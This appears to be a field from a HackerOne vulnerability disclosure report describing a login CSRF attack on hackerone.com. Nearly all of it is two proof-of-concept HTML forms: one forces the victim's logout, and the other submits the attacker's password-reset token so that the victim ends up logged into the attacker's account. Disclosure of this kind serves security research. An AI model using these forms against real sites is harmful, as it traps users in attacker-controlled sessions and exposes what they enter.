  "vulnerability_information": "Two requests are needed to make it happen.\r\n\r\nRequest1 (log out the user):\r\n\r\n<html>\r\n  <body>\r\n    <form action=\"https://hackerone.com/users/sign_out\" method=\"POST\">\r\n      <input type=\"hidden\" name=\"&#95;method\" value=\"delete\" />\r\n      <input type=\"submit\" value=\"Submit request\" />\r\n    </form>\r\n  </body>\r\n</html>\r\n\r\nRequest2 (log in the user to the attacker's account):\r\n\r\n<html>\r\n  <body>\r\n    <form action=\"https://hackerone.com/users/password\" method=\"POST\">\r\n      <input type=\"hidden\" name=\"utf8\" value=\"Ã¢&#156;&#147;\" />\r\n      <input type=\"hidden\" name=\"&#95;method\" value=\"put\" />\r\n      <input type=\"hidden\" name=\"user&#91;reset&#95;password&#95;token&#93;\" value=\"ENTER_HERE_RESET_PASSWORD_TOKEN_FROM_MAIL\" />\r\n      <input type=\"hidden\" name=\"user&#91;password&#93;\" value=\"ENTER_HERE_NEW_PASSWORD\" />\r\n      <input type=\"hidden\" name=\"user&#91;password&#95;confirmation&#93;\" value=\"ENTER_HERE_NEW_PASSWORD\" />\r\n      <input type=\"hidden\" name=\"commit\" value=\"Change&#32;password\" />\r\n      <input type=\"submit\" value=\"Submit request\" />\r\n    </form>\r\n  </body>\r\n</html>\r\n\r\nPlease let me know if more detailed description is needed.\r\n\r\nRegards,\r\nDawid Czagan",
